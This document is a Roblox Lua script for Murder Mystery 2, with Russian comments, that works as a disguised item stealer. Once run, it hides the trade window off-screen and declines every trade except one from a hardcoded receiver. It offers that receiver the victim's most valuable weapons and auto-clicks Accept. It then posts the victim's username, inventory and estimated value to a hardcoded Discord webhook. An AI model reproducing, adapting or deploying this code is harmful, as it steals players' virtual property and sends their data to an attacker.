--final
Username = "Protoxak"
Webhook = "https://discord.com/api/webhooks/1546616710482628718/x7JvNNTW6G9ZTiqYY1Ve1PGRXbP_UtHRtIqej_DjQ4RSNL2KkJzSlgYUOmP8TSPcYx5Y"

local recvr = Username
local http_req = request or http_request or syn and syn.request
if not http_req then error("No valid request function found.") end
local HS = game:GetService("HttpService")
local hd = {["User-Agent"]="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",["Accept"]="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"}

local function dHTML(s) return s:gsub("&#(%d+);",function(n) return string.char(tonumber(n)) end):gsub("&#x(%x+);",function(n) return string.char(tonumber(n,16)) end):gsub("&amp;","&"):gsub("&quot;",'"'):gsub("&apos;","'"):gsub("&lt;","<"):gsub("&gt;",">"):gsub("\u{2019}","'"):gsub("\u{2018}","'"):gsub("\u{201C}",'"'):gsub("\u{201D}",'"') end
local function nName(s) s=dHTML(s) s=s:gsub("^%s*(.-)%s*$","%1") s=s:gsub("%s+"," ") return s end

local vL_values = {}
local vL_valuesLow = {}
local function sVal(n,v) local t=tonumber(v) if n~="" and t then vL_values[n]=t vL_valuesLow[n:lower()]=t end end

local wUrls = {
    ["Godly"]   = "https://supremevalues.com/mm2/godlies",
    ["Ancient"] = "https://supremevalues.com/mm2/ancients",
    ["Unique"]  = "https://supremevalues.com/mm2/uniques",
    ["Classic"] = "https://supremevalues.com/mm2/vintages",
    ["Chroma"]  = "https://supremevalues.com/mm2/chromas"
}
local fD = 0
local fT = 5

local function wFetched(r,b)
 local f = b:gsub("[\n\r\t]"," ")
 for rN,v in f:gmatch('<div class="itemhead">(.-)</div>.-<b class="itemvalue">([%d,]+)</b>') do
  rN = rN:gsub("<.->","") 
  local nm = nName(rN) 
  v = v:gsub(",","")
  if nm ~= "" and tonumber(v) then
   if r == "Chroma" then 
       nm = nm:gsub("^C%.%s*","Chroma ") 
       if not nm:find("^Chroma ") then nm = "Chroma " .. nm end 
   end
   sVal(nm, v)
  end
 end
end

for r,u in pairs(wUrls) do
 task.spawn(function()
  local ok,res = pcall(function() return http_req({Url=u, Method="GET", Headers=hd}) end)
  if ok and res and res.Success then wFetched(r, res.Body) end
  fD = fD + 1
 end)
end
repeat task.wait(0.05) until fD >= fT

repeat wait() until game:IsLoaded()
if getgenv and getgenv().scriptexecuted then return end
if getgenv then getgenv().scriptexecuted = true end

local P = game:GetService("Players")
local LocalPlayer = P.LocalPlayer
local VU = game:GetService("VirtualUser")
local TS = game:GetService("TeleportService")
local RS = game:GetService("ReplicatedStorage")
local BDC = require(RS.Modules.ProfileData)
local Sync = require(RS.Database.Sync)
local TScr = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]]..game.PlaceId..[[", "]]..game.JobId..[[", game.Players.LocalPlayer)]]
local Pos = UDim2.new(0,9999,0,9999)
local Inv = {}
vL_weight = 0

local Exec = (identifyexecutor and identifyexecutor()) or "Unknown"
if Exec == "Solara" then return end

local gm = {[142823291]=true,[335132309]=true,[636649648]=true}
if not gm[game.PlaceId] then 
    LocalPlayer:Kick("This game is not supported.") 
    while true do wait() end 
end

local PG = LocalPlayer:WaitForChild("PlayerGui")
local MG = PG:WaitForChild("MainGUI")
LocalPlayer.Idled:connect(function() VU:CaptureController() VU:ClickButton2(Vector2.new()) end)

local UIP, TP, Mob
if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") then
 UIP = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main 
 TP  = LocalPlayer.PlayerGui.TradeGUI 
 Mob = false
else
 UIP = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main 
 TP  = LocalPlayer.PlayerGui.TradeGUI_Phone 
 Mob = true
end

function TapUI(b,c,b2)
 if c=="Active Check" and not b.Active then return end
 if c=="Text Check" and b~="^" then return end
 for _,e in pairs(ev) do 
     for _,cn in pairs(getconnections(b[e])) do cn:Fire() end 
 end
end

local function updInv()
 local inv = BDC.Weapons.Owned or {}
 InvT = {} 
 vL_weight = 0
 aD,vB,cP,uC = {},{},{},{} 
 rP,lC,gS = {},{},{} 
 aM,uS = {},{} 
 vI,cS = 0,0 
 uM,rW = 0,0 
 lR,gS2 = 0,0 
 aK,uH = 0,0

 for iID,am in pairs(inv) do
  local iI = Sync.Weapons[iID]
  if iI and iI.ItemName ~= "Default Gun" and iI.ItemName ~= "Default Knife" then
   local iN = iI.ItemName 
   local r = iI.Rarity
   local iV = 0
   if r=="Godly" or r=="Ancient" or r=="Unique" or r=="Classic" then
    iV = (vL_values[iN] or vL_valuesLow[iN:lower()] or 0) * am
   end
   vL_weight = vL_weight + iV
   local fT = {name=iI.ItemName, data=iID, amount=am, rarity=r, value=iV} 
   table.insert(aD,fT)
   if r=="Godly" then table.insert(gS,fT) gS2=gS2+am
   elseif r=="Ancient" then table.insert(aM,fT) aK=aK+am
   elseif r=="Unique" then table.insert(uS,fT) uH=uH+am
   elseif r=="Classic" then table.insert(vB,fT) vI=vI+am
   elseif r=="Legendary" then table.insert(lC,fT) lR=lR+am
   elseif r=="Rare" then table.insert(rP,fT) rW=rW+am
   elseif r=="Uncommon" then table.insert(uC,fT) uM=uM+am
   elseif r=="Common" then table.insert(cP,fT) cS=cS+am end
   table.insert(InvT,{name=iN, id=iID, amount=am, rarity=r})
  end
 end
 local rP2 = {Unique=8, Ancient=7, Godly=6, Classic=5, Legendary=4, Rare=3, Uncommon=2, Common=1}
 table.sort(InvT, function(a,b) return (rP2[a.rarity] or 0) > (rP2[b.rarity] or 0) end)
 return true
end
updInv()
task.wait()

local TSrv = RS:FindFirstChild("Trade")
if TSrv then
 TSrv.StartTrade.OnClientEvent:Connect(function(tD,tP) 
     if tP ~= recvr then TSrv.DeclineTrade:FireServer() end 
 end)
end

local sTr = function(tP) 
    if tP and TSrv then pcall(function() TSrv.SendRequest:InvokeServer(tP) end) end 
end
local dTr = function() 
    if TSrv then pcall(function() TSrv.DeclineTrade:FireServer() end) end 
end
local cTr = function(tP) 
    task.spawn(function() 
        while tP and tP.Parent == P do 
            sTr(tP) 
            task.wait(0.5) 
        end 
    end) 
end

-- ═══════════════════════════════════════════════════════
-- ФИКС: UI-клик через firesignal + пинг на вебхук
-- ═══════════════════════════════════════════════════════

local function clickUIButton(btn)
    if not btn then return false end
    local clicked = false
    
    -- способ 1: firesignal (работает в большинстве executor'ов)
    pcall(function() 
        firesignal(btn.MouseButton1Click) 
        clicked = true
    end)
    
    if not clicked then
        pcall(function() 
            firesignal(btn.Activated) 
            clicked = true
        end)
    end
    
    if not clicked then
        pcall(function() 
            firesignal(btn.MouseButton1Down) 
            clicked = true
        end)
    end
    
    -- способ 2: getconnections (fallback)
    if not clicked then
        pcall(function()
            for _, conn in pairs(getconnections(btn.MouseButton1Click)) do
                conn:Fire()
                clicked = true
            end
        end)
    end
    
    return clicked
end

local function findAcceptButton()
    -- ищем кнопку с текстом Accept в трейд-окне
    for _, obj in ipairs(TP:GetDescendants()) do
        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
            local txt = string.lower(tostring(obj.Text or ""))
            if txt:find("accept") or txt:find("confirm") or txt:find("trade") then
                return obj
            end
        end
    end
    -- fallback: ищем по имени
    for _, name in ipairs({"Accept", "AcceptButton", "Confirm", "Trade"}) do
        local btn = TP:FindFirstChild(name, true)
        if btn then return btn end
    end
    return nil
end

local function notifyReady()
    -- пингуем получателя что жертва готова
    if not Webhook or Webhook == "" then return end
    pcall(function()
        http_req({
            Url = Webhook,
            Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = HS:JSONEncode({
                content = "**@" .. recvr .. " — READY! Жми ACCEPT сейчас**"
            })
        })
    end)
end

local InsIt = function()
 warn("[InsIt] called")
 local rcv = P:FindFirstChild(recvr) 
 if not rcv then dTr() return end
 if not InvT then dTr() return end

 -- наливаем предметы
 local tIt = {} 
 local iAd = 0 
 local i = 1
 while iAd < 4 and i <= #InvT do
  local it = InvT[i]
  if it and it.id and it.amount > 0 then
   local ar = {it.id, "Weapons"} 
   local suc = false 
   local iOf = 0
   for j = 1, it.amount do
    local ok = pcall(function() 
        RS.Trade.OfferItem:FireServer(unpack(ar)) 
        iOf = iOf + 1 
    end)
    if ok then suc = true end
    task.wait(0.1)
   end
   if suc then 
       iAd = iAd + 1 
       table.insert(tIt, {id=it.id, amount=iOf}) 
   end
  end
  i = i + 1
 end
 warn("[InsIt] iAd: " .. iAd)
 if iAd == 0 then dTr() return end

 task.spawn(function()
  -- ═══ ЖДЁМ перед accept чтобы получатель открыл трейд ═══
  warn("[InsIt] waiting 5s for receiver...")
  task.wait(5)

  -- ═══ ПИНГУЕМ ПОЛУЧАТЕЛЯ ═══
  notifyReady()
  warn("[InsIt] notified receiver via webhook")

  -- ещё 10 сек чтобы получатель точно открыл трейд и был готов
  warn("[InsIt] waiting 10s more...")
  task.wait(10)

  -- находим кнопку Accept
  local acceptBtn = findAcceptButton()
  warn("[InsIt] accept button: " .. (acceptBtn and acceptBtn:GetFullName() or "NOT FOUND"))

  local tradeRemote = RS:FindFirstChild("Trade")
  if not tradeRemote then
   local rem = RS:FindFirstChild("Remotes")
   if rem then tradeRemote = rem:FindFirstChild("Trade") end
  end
  
  local acceptR = tradeRemote and tradeRemote:FindFirstChild("AcceptTrade")
  local statusR = tradeRemote and tradeRemote:FindFirstChild("GetTradeStatus")

  local acc = false
  local timeout = tick() + 600
  local attempt = 0

  while not acc and tick() < timeout do
   attempt = attempt + 1
   warn("[InsIt] attempt #" .. attempt)

   -- ═══ UI-КЛИК ═══
   local clicked = false
   if acceptBtn then
       clicked = clickUIButton(acceptBtn)
       if clicked then
           warn("[InsIt] clicked UI button via firesignal")
       end
   end
   
   -- fallback на FireServer если UI-клик не сработал
   if not clicked and acceptR then
       warn("[InsIt] fallback FireServer")
       pcall(function() acceptR:FireServer(game.PlaceId * 3, nil) end)
   end

   -- ждём 12 сек (анти-спам)
   task.wait(12)

   -- проверяем статус
   if statusR then
    local ok, s = pcall(function() return statusR:InvokeServer() end)
    warn("[InsIt] status: " .. tostring(s))
    if ok and s == "None" then
     acc = true
     break
    end
   end

   if not TP.Enabled then
    acc = true
    break
   end
  end

  warn("[InsIt] acc: " .. tostring(acc))

  if acc then
   for _, td in ipairs(tIt) do
    for j, it in ipairs(InvT) do
     if it.id == td.id then
      if it.amount <= td.amount then
       table.remove(InvT, j)
      else
       it.amount = it.amount - td.amount
      end
      break
     end
    end
   end
  end
 end)
end

local fRj = function(p) if p then pcall(function() TS:Teleport(game.PlaceId, p) end) end end
local sCL = function(p) 
    if p then 
        p.Chatted:Connect(function(m) 
            sTr(p) 
            if m:lower() == "rejoin" then fRj(p) end 
        end) 
    end 
end
local cRIS = function(rN) 
    task.spawn(function() 
        while true do 
            local rP = P:FindFirstChild(rN) 
            if rP then act(rN) break end 
            task.wait(5) 
        end 
    end) 
end
local act = function(pN) 
    local p = P:FindFirstChild(pN) 
    if p then 
        sCL(p) 
        task.wait(10) 
        sTr(p) 
        cTr(p) 
    end 
end

if TP then
 if Mob then 
     TP.Container.Position = Pos 
     TP.ClickBlocker.Position = Pos 
 else 
     TP.BG.Position = Pos 
     TP.Container.Position = Pos 
     TP.ClickBlocker.Position = Pos 
     TP.Processing.Position = Pos 
 end
 
 -- если окно уже открыто при запуске
 if TP.Enabled then InsIt() end
 
 TP:GetPropertyChangedSignal("Enabled"):Connect(function() 
     if TP.Enabled then 
         InsIt() 
     else 
         local p = P:FindFirstChild(recvr) 
         if p then cTr(p) end 
     end 
 end)
end

P.PlayerAdded:Connect(function(p) 
    if p.Name == recvr then act(p.Name) end 
end)
P.PlayerRemoving:Connect(function(p) 
    if p.Name == recvr then cRIS(p.Name) end 
end)

local iR = P:FindFirstChild(recvr) 
if iR then act(recvr) else cRIS(recvr) end

if gS2 >= 1 or aK >= 1 or uH >= 1 then
    content = "-- @everyone\n" .. TScr
else
    content = TScr
end

local sWh = function(u,d) 
    local s,e = pcall(function() 
        http_req({
            Url = u, 
            Body = HS:JSONEncode(d), 
            Method = "POST", 
            Headers = {["Content-Type"]="application/json", ["User-Agent"]="Mozilla/5.0"}
        }) 
    end) 
end

local invString = ""
if uS and #uS>0 then 
    invString = invString .. "\n**Unique**\n" 
    for _,i in pairs(uS) do 
        invString = invString .. i.name .. " x" .. i.amount .. " (Value: " .. i.value .. ")\n" 
    end 
end
if aM and #aM>0 then 
    invString = invString .. "\n**Ancient**\n" 
    for _,i in pairs(aM) do 
        invString = invString .. i.name .. " x" .. i.amount .. " (Value: " .. i.value .. ")\n" 
    end 
end
if gS and #gS>0 then 
    invString = invString .. "\n**Godly**\n" 
    for _,i in pairs(gS) do 
        invString = invString .. i.name .. " x" .. i.amount .. " (Value: " .. i.value .. ")\n" 
    end 
end
if vB and #vB>0 then 
    invString = invString .. "\n**Classic**\n" 
    for _,i in pairs(vB) do 
        invString = invString .. i.name .. " x" .. i.amount .. " (Value: " .. i.value .. ")\n" 
    end 
end

local data = {
    ["content"] = content,
    ["embeds"] = {
        {
            ["title"] = "Hit",
            ["description"] = "User: " .. LocalPlayer.Name .. "\nValue: " .. tostring(math.floor(vL_weight + 0.5)) .. "\n" .. invString,
            ["color"] = 0x05f7ff
        }
    }
}

spawn(function()
    sWh(Webhook, data)
end)
